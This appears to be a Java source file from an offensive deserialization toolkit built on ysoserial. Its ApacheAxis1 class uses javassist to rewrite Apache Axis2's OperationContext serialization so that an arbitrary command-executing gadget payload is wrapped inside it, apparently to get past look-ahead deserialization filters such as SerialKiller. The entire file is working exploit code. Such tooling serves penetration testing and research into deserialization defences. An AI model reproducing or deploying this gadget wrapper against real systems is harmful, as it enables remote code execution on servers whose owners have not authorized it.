package serialkiller.bypass;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import java.lang.reflect.Constructor;
import org.apache.axis2.context.OperationContext;
import ysoserial.payloads.annotation.Dependencies;

/**
 * Created by alvaro on 08/04/16.
 */

@Dependencies({ "org.apache.axis2:axis2-kernel:1.4" })
public class ApacheAxis1 implements BypassGadget {

    public Object wrapPayload(String command, Class payload) throws Exception {

        String payload_class = payload.getName();

        ClassPool pool = ClassPool.getDefault();
        CtClass c = pool.get("org.apache.axis2.context.OperationContext");
        CtClass objectOutputClass = pool.get("java.io.ObjectOutput");

        CtMethod writeExternalOrig = c.getDeclaredMethod("writeExternal");
        writeExternalOrig.setName("writeExternalDisabled");

        CtMethod writeExternalNew = new CtMethod(CtClass.voidType, "writeExternal", new CtClass[] {objectOutputClass}, c);
        String code = "{" +
                "org.apache.axis2.context.externalize.SafeObjectOutputStream out = org.apache.axis2.context.externalize.SafeObjectOutputStream.install($1);" +
                "out.writeLong(-7264782778333554350L);" +
                "out.writeInt(2);" +
                "out.writeLong(0L);" +
                "out.writeBoolean(true);" +
                "java.io.ByteArrayOutputStream bytesOut = new java.io.ByteArrayOutputStream();" +
                "java.io.ObjectOutputStream objOut = new java.io.ObjectOutputStream(bytesOut);" +
                "java.lang.Object payload = new " + payload_class + "().getObject(\"" + command + "\");" +
                "out.writeObject(payload);" +
                "}";
        writeExternalNew.setBody(code);
        c.addMethod(writeExternalNew);
        Class instrumentedClass = c.toClass();
        Constructor ctor = instrumentedClass.getConstructor();
        OperationContext operationContext = (OperationContext) ctor.newInstance();

        return operationContext;
    }

    public boolean bypassXStream() { return false; }
    public boolean skipTest() { return false; }
}
